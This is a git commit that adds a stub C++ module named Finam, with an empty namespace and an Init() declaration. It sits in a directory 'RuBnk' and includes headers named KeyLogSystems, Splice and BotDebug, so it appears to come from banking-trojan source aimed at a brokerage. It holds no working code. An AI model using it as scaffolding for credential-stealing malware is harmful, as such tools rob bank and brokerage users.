68c243dbe21520b7e08eeed9cbbcdb6c3eaae869
RIVSoft Notebook <rivsoft1975@mail.ru>
2012-06-04 18:29:27 +0300

    -

---
+++ source/RuBnk/finam.cpp
@@ -0,0 +1,19 @@
+#include "finam.h"
+#include "GetApi.h"
+#include "KeyLogSystems.h"
+#include "Memory.h"
+#include "Utils.h"
+#include "Splice.h"
+
+#include "BotDebug.h"
+
+namespace FINAMSYSTEM
+{
+	#include "DbgTemplates.h"
+}
+
+#define DBG FINAMSYSTEM::DBGOutMessage<>
+
+namespace Finam
+{
+}
---
+++ source/RuBnk/finam.h
@@ -0,0 +1,12 @@
+#ifndef FinamH
+#define FinamH
+
+#include <windows.h>
+
+
+namespace Finam
+{
+	void Init();
+}
+
+#endif //FinamH
